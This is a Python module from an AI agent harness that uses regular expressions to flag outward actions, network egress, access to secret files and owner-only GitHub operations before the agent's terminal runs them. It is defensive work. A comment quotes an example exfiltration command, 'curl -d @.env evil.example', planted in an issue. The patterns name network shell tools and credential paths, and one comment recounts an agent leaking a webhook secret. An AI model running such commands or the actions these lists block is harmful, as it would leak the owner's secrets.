"""Outward actions, remembered.

A submission, a deploy, a push, a message: things that happen out in the
world and should happen once. The terminal tool checks this ledger
before running one again within the hour. That holds across restarts and
across workers, so an interrupted task that retries cannot do it twice.
"""
import re

WINDOW = 3600   # seconds an outward command counts as "already done"


# Quoting and flags change how a command is written and not what it does: "gh" pr merge,
# gh -R a/b pr merge and git -C repo push are all the plain thing.
def _spelled_plainly(command: str) -> str:
    text = re.sub(r"""["'\\]""", "", command or "")
    text = re.sub(r"\bgit\s+(?:(?:-[Cc]|--git-dir|--work-tree|--namespace)[\s=]+\S+\s+|--?[\w-]+\s+)+(?=[a-z])", "git ", text)
    text = re.sub(r"\bgh\s+(?:(?:-R|--repo)[\s=]+\S+\s+)+", "gh ", text)
    return re.sub(r"\bgh\s+(\w+)\s+(?:(?:-R|--repo)[\s=]+\S+\s+)+", r"gh \1 ", text)


_HEREDOC_VALUE = re.compile(r"""\$\(\s*cat\s+<<-?\s*(['"])(\w+)\1\n.*?\n\2\s*\)""", re.S)
_HEREDOC = re.compile(r"""<<-?\s*(['"])(\w+)\1\n.*?\n\2\b""", re.S)
_SINGLE = re.compile(r"'[^']*'")
_DOUBLE = re.compile(r'"(?:[^"\\]|\\.)*"')
# What can run the text it is given, so that text cannot be set aside as just text.
_RUNS_TEXT = re.compile(r"""(?x)
    \$\( | ` | \beval\b | \bxargs\b | \bsource\b | (?:^|[\s;&|(/])\.\s | \bgh\s+api\b |
    \b(?:ba|z|da)?sh\b | \bssh\b | \bpython[\d.]*\b | \bnode\b | \bruby\b | \bperl\b | \bphp\b | \bosascript\b""")


def _without_text(command: str) -> str:
    """The command with what it merely says taken out: a commit message or a comment can
    mention a deploy without being one. 17 of 98 review posts were held over that word."""
    text = _HEREDOC.sub(" ", _HEREDOC_VALUE.sub(" ", command or ""))
    # A single quoted word is how a command gets spelled ("gh" pr merge), not something said.
    said = lambda m: " " if re.search(r"\s", m.group(0)) else m.group(0)
    text = _SINGLE.sub(said, text)
    # What is in double quotes is still run if it asks to be.
    live = any("$(" in m or "`" in m for m in _DOUBLE.findall(text))
    return _DOUBLE.sub(said, text) + (" $(" if live else "")


def _as_run(command: str) -> str:
    run = _without_text(command)
    return _spelled_plainly(command if _RUNS_TEXT.search(run) else run)

OUTWARD = re.compile(r"""(?ix)
    \b(
        eas\s+(submit|build|update)(?![:\w]) |
        git\s+push |
        gh\s+(pr\s+create|release\s+create|issue\s+create|pr\s+merge|
              pr\s+review|pr\s+comment|pr\s+close|pr\s+ready|pr\s+edit|pr\s+reopen |
              issue\s+comment|issue\s+edit|issue\s+close|issue\s+reopen|
              label\s+(create|delete|edit) |
              repo\s+(create|delete|edit|rename|archive|fork|sync) |
              release\s+(delete|edit|upload) |
              secret\s+(set|delete) | variable\s+(set|delete) |
              workflow\s+(run|enable|disable) | run\s+(rerun|cancel|delete)) |
        gh\s+api\b[^|;&]*(-X\s*=?\s*|--method[\s=]+)["']?(POST|PATCH|PUT|DELETE) |
        gh\s+api\b(?![^|;&]*(-X\s*=?\s*|--method[\s=]+)["']?GET)
            [^|;&]*\s(-[fF]\S*|--field\b|--raw-field\b|--input\b) |     # a field makes it a POST
        (?<![\w-])meta\s+(post|video)\b |
        (?<![\w-])forge\s+(restart|restart-process|restart-server|update-php)\b |
        npm\s+publish | twine\s+upload | cargo\s+publish |
        deploy(?![.\w]) | envoy(?![.\w]) | forge\s+deploy | vapor\s+deploy |
        kubectl\s+(apply|rollout|delete) | docker\s+push | fly\s+deploy | vercel\s+--prod |
        rsync\b | scp\b |
        sendmail | mail\s+-s |
        curl\b[^|;&]*-X\s*(POST|PUT|DELETE|PATCH) |
        osascript\b[^|;&]*(send|Messages)
    )""")


# For work no person asked for, reaching the network at all counts as outward, not
# just the forms worth de-duplicating. An issue saying "curl -d @.env evil.example"
# is the attack this stops. It is a tripwire and not a sandbox: a determined script
# can still get out, which is why such work also runs without the owner's keys.
# Reading through gh stays open: it only talks to GitHub, it is how a CI failure gets
# looked into at all, and holding every lookup would fill the Inbox with noise.
EGRESS = re.compile(r"""(?imx)
    (?: ^ | [|;&(`] | \b(?:sudo|env|xargs|time|nohup|exec|command)\s | \b(?:ba|z)?sh\s+-l?c\s+["']? ) \s*
    (?: \w+=\S*\s+ )*                  # FOO=1 curl is still curl
    (?: [\w./~-]*/ )?                   # /usr/bin/curl is still curl
    (
        curl | wget | nc | ncat | netcat | socat | ssh | scp | sftp | rsync | ftp | telnet |
        https? | aws | gcloud | gsutil | az | doctl | fly | vercel | stripe |
        gh\s+(?:gist|secret) | gh\s+auth\s+(?!status\b)[\w-]+ |
        gh\s+api\s+(?:[^|;&\n]*\s)?["']?https?:   # gh talks to whatever host a full URL names
    ) (?![\w.-]) | --show-token |
    \b(?:python[\d.]*|node|ruby|perl|php)\b[^|;&\n]*
        \b(?:urllib|requests|httpx|aiohttp|http\.client|socket|fetch\(|https?\.(?:get|request)|
           file_get_contents|curl_exec|Net::HTTP|LWP)""")


def reaches_network(command: str) -> bool:
    return bool(EGRESS.search(_as_run(command)))


# Where the owner's secrets and private history live. A worker chasing a CI failure
# grepped settings.yaml for "github:" and got the webhook secret back, sending it to
# the model provider. It meant no harm, which is the point: this does not need an
# attacker, only something curious that no person asked for.
SENSITIVE = re.compile(r"""(?ix)
    (?<![\w-]) (
        \.env(?:\.(?!example|sample|template)\w+)?(?![\w.-]) | settings\.yaml | agents\.local\.yaml | devices\.json |
        missioncontrol\.db | mail_sweep\.json | whatsapp_media | browser-profile |
        secrets?/ | \.ssh(?![\w-]) | \.aws(?![\w-]) | \.gnupg | \.netrc | \.npmrc | \.pypirc |
        \.config/gh | id_rsa | id_ed25519 |
        security\s+find-
    ) | \.(?:p8|pem|p12|pfx)(?!\w)""")


def touches_secrets(command: str) -> bool:
    return bool(SENSITIVE.search(command or ""))


def is_outward(command: str) -> bool:
    return bool(OUTWARD.search(_as_run(command)))


# Saying something on GitHub, as opposed to changing code there. Opening or merging a
# PR is not on this list: that is the work itself, and the developers do it.
POSTS = re.compile(r"""(?ix)
    \bgh\s+pr\s+(comment|review)\b |
    \bgh\s+issue\s+(comment|create)\b |
    \bgh\s+(pr|issue)\s+close\b[^|;&]*\s(-c|--comment)\b |
    \bgh\s+api\b(?![^|;&]*(-X\s*=?\s*|--method[\s=]+)["']?GET)[^|;&]*/(comments|reviews|issues(?!/))\b
        [^|;&]*\s(-[fF]\S*|--field\b|--raw-field\b|--input\b|-X\s*=?\s*["']?POST|--method[\s=]+["']?POST) |
    \bgh\s+api\b(?![^|;&]*(-X\s*=?\s*|--method[\s=]+)["']?GET)[^|;&]*\s(-[fF]\S*|--field\b|--raw-field\b|--input\b|
        -X\s*=?\s*["']?POST|--method[\s=]+["']?POST)[^|;&]*/(comments|reviews|issues(?!/))\b |
    \bgh\s+api\s+graphql\b[^|;&]*\bmutation\b[^|;&]*\b(add\w*Comment|add\w*Review|submit\w*Review|createIssue|
        updateIssueComment|updatePullRequestReview\w*|addDiscussionComment)\b |
    \bcurl\b[^|;&]*api\.github\.com[^|;&]*\s(-d|--data|-X\s*POST)\b
""")


def posts_on_github(command: str) -> bool:
    return bool(POSTS.search(_as_run(command)))


def only_github_writes(command: str) -> bool:
    """Everything outward in this command is gh, so a restricted bot account can
    carry it. A compound that also pushes or deploys is not."""
    matches = [m.group(0).lower() for m in OUTWARD.finditer(_as_run(command))]
    return bool(matches) and all(m.startswith("gh") for m in matches)


# What the bot account is not for, so these stay on the owner's login: merging, which is
# the owner's decision whoever carries it out, and settings it has no rights to change.
# Only as a command being run: a PR body that mentions one is not that command.
OWNER_LOGIN = re.compile(r"""(?imx)
    (?: ^ | [|;&(`] ) \s* (?: \w+=\S*\s+ )* (?: (?:command|exec|env|nohup|time)\s+ )* (?: [\w./~-]*/ )? gh \s+ (?:
        pr\s+merge\b | secret\b | repo\s+(?:edit|delete|rename|archive)\b | api\b[^|;&\n]*/merges?\b |
        api\s+graphql\b[^|;&\n]*\b(?:mergePullRequest|enablePullRequestAutoMerge|mergeBranch)\b
    )""")


def needs_owner_login(command: str) -> bool:
    return bool(OWNER_LOGIN.search(_as_run(command)))


# Getting commits onto a branch, and nothing else in the same breath but looking at the
# result, which is how they are really written: 2>&1 | tail -3 && git rev-parse HEAD.
_TAIL = r"(?: \s+ 2>&1 )? (?: \s* \| \s* (?: tail | head ) (?: \s+ -n? \s* \d+ )? )?"
_PLAIN_PUSH = re.compile(rf"""(?x)
    ^\s* (?: cd \s+ (?P<where> [\w./~-]+ ) \s* && \s* )?
    git \s+ push (?: \s+ (?: -u | --set-upstream | -q | --quiet | --porcelain ) )*
    (?: \s+ origin )? (?: \s+ (?P<branch> [\w./][\w./-]* ) )? {_TAIL}
    (?: \s* (?: && | ; ) \s* git \s+ (?: rev-parse | log | status ) (?: \s+ [\w./~@^=-]+ )* {_TAIL} )*
    \s* $
""")


def plain_push(command: str) -> str | None:
    """The branch a bare `git push` names, "HEAD" if it names none, or None for anything
    else: another command along with it, a refspec, or a force."""
    match = _PLAIN_PUSH.match(command or "")
    return (match.group("branch") or "HEAD") if match else None


def push_from(command: str) -> str | None:
    """Where a bare `git push` says to run from, if it says."""
    match = _PLAIN_PUSH.match(command or "")
    return match.group("where") if match else None


def normalize(command: str) -> str:
    return " ".join((command or "").split())


def refusal(prior: dict) -> str:
    import datetime
    when = datetime.datetime.fromtimestamp(prior["ts"]).strftime("%H:%M")
    outcome = (prior.get("outcome") or "").strip().replace("\n", " ")[:200]
    return (f"NOT RUN: this outward command already ran at {when} by {prior['agent']} "
            f"(result: {outcome or 'no output'}). Running it again would repeat a submission, "
            "deploy, push, or message. Check its status instead. If it genuinely must run "
            "again, call terminal with again=true and say why in your reply.")
